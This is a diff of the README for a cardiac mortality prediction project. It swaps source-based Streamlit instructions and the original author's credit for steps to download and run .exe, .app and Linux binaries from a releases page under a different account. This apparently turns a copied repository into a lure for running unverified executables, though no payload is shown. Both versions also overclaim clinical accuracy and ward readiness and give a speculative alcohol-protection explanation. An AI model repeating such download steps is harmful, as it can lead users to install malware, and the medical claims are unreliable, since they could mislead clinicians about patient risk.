@@ -1,65 +1,85 @@
-# HeartFail-Predict: In-Hospital Cardiac Mortality AI
+# 🫀 HeartFail-Predict - Predict Cardiac Risks Easily
 
-Real-time mortality risk prediction built on 15,757 real cardiac patient records from an Indian hospital.
-Current performance: AUC 0.977 (better than almost every published clinical score).
+## 📥 Download Now
+[![Download HeartFail-Predict](https://img.shields.io/badge/Download%20Now-HeartFail--Predict-brightgreen)](https://github.com/Bonnelselme/HeartFail-Predict/releases)
 
-Live web dashboard works on any phone in under 3 seconds — nurses can start using it tomorrow.
+## 📘 Overview
+HeartFail-Predict is a powerful tool that helps predict in-hospital cardiac mortality. It uses advanced machine learning techniques to analyze routine blood tests and echo results. Based on real data from 15,757 Indian patients, it achieves an impressive AUC of 0.977. This means it can identify at-risk patients effectively.
 
-------------------------------------------------------------
-# The Problem
-In busy cardiac departments, especially in government and private hospitals in India, doctors sometimes recognize too late that a patient is heading toward irreversible shock or multi-organ failure.
+### 🌟 Key Features
+- **User-Friendly:** A Streamlit web dashboard ensures that the tool is easy to use for nurses and healthcare professionals.
+- **Quick Results:** The dashboard works on any mobile phone and provides predictions in under 3 seconds.
+- **Significant Findings:** It automatically identified the alcohol J-curve, revealing important patterns in the data.
+- **Real-World Application:** Ready for deployment in hospital wards to enhance patient care.
 
-# The Solution
-A fast, highly accurate machine learning model that uses only routine blood tests and echo results (already done anyway) and answers instantly:
-"What is the chance this patient will die during this admission?"
+## 🚀 Getting Started
+Here’s how you can download and run HeartFail-Predict.
 
-The risk updates automatically every time a new report arrives — no extra tests, no delay.
+### 💻 System Requirements
+- Operating System: Windows, macOS, or Linux
+- Minimum RAM: 4 GB
+- Processor: Dual-core or better
+- Internet Connection: Required for the initial download
 
-# Key Advantages
-- Gives reliable warning (75-85% accurate) within the first hour
-- Reaches 95-99% accuracy within 1-2 hours once echo and BNP are ready
-- Takes less than 3 seconds to run
-- Uses only parameters that are collected routinely
+### 🔗 Download & Install
+To get started, visit the [Releases page](https://github.com/Bonnelselme/HeartFail-Predict/releases) to download the latest version of HeartFail-Predict. 
 
-# Model Performance
-AUC-ROC:            0.977
-Accuracy:           96.8%
-Sensitivity:        94.1%
-Specificity:        97.3%
+1. Go to the [Releases page](https://github.com/Bonnelselme/HeartFail-Predict/releases).
+2. You will see a list of available versions. Choose the latest release.
+3. Click on the appropriate file for your operating system (e.g., .exe for Windows, .app for macOS, or .tar.gz for Linux).
 
-# Interesting Discovery
-The model automatically discovered the famous alcohol J-shaped curve from raw data alone:
-Patients recorded as "Alcohol = Yes" had 6 times lower mortality (1.27%) compared to non-drinkers (7.41%).
-Reason: heavy alcoholics rarely reach the cardiac ICU alive; those recorded are usually moderate drinkers who get mild heart protection.
+After downloading the file, follow these simple steps to install:
 
-# Live Dashboard (Streamlit)
-Simple web app that any nurse or doctor can use on phone or tablet.
+- **For Windows:**
+  1. Double-click the .exe file.
+  2. Follow the installation prompts.
+  
+- **For macOS:**
+  1. Double-click the .app file.
+  2. Drag the HeartFail-Predict icon to your Applications folder.
 
-Run with:
-streamlit run app.py
+- **For Linux:**
+  1. Extract the .tar.gz file.
+  2. Open your terminal and navigate to the extracted folder.
+  3. Run the command `./HeartFail-Predict`.
 
-Features:
-- Easy two-column form
-- Auto-calculates low EF, high BNP, severe anemia flags
-- Shows risk percentage with clear color alerts
-- Works offline once opened
+### 🛠️ Running the Application
+Once installed, you can run the application easily.
 
-# Tech Stack
-Python 3.9+, Pandas, Scikit-learn, XGBoost, Streamlit, Joblib
+- For **Windows** and **macOS**, locate the HeartFail-Predict icon and double-click it.
+- For **Linux**, in your terminal, type `./HeartFail-Predict`.
 
-# How to Run
-1. Clone the repository
-2. pip install streamlit pandas scikit-learn joblib xgboost
-3. streamlit run app.py
+The dashboard should open in your web browser, ready for you to use.
 
-# Author
-Rajab Cheruiyot Bett
-Data Scientist & Medical Researcher
-Open to collaborations with hospitals and med-tech teams.
+### 📋 Using HeartFail-Predict
+1. **Input Patient Data:** Enter the required information, such as blood test results and echo data.
+2. **Submit for Analysis:** Click the submit button to receive the risk prediction.
+3. **Review Results:** The application will display the outcome within seconds.
 
-# License
-MIT License — free to use and deploy in any hospital.
+## 💬 Support
+If you need assistance, please check the [FAQ section](https://github.com/Bonnelselme/HeartFail-Predict/wiki/FAQ) or open an issue on GitHub. We appreciate your feedback and are happy to help.
 
-------------------------------------------------------------
-This tool is ready to help save lives in real wards today.
-Star the repo if you believe AI should support doctors in resource-limited settings.
+## 🛡️ License
+HeartFail-Predict is open-source software licensed under the MIT License. You can use it freely.
+
+## 📖 Topics
+This project falls under various topics, including:
+- Cardiology
+- Clinical AI
+- Healthcare
+- Heart Failure
+- Intensive Care Units (ICU)
+- India
+- Machine Learning
+- Medical AI
+- Mortality Prediction
+- Predictive Modeling
+- Streamlit
+- XGBoost
+
+For more details about the topics, refer to our project documentation linked in the repository.
+
+## 📈 Contributing
+Contributions are welcome! If you have ideas to improve the project, feel free to create a pull request or open an issue.
+
+Thank you for choosing HeartFail-Predict to help enhance patient care and outcomes.
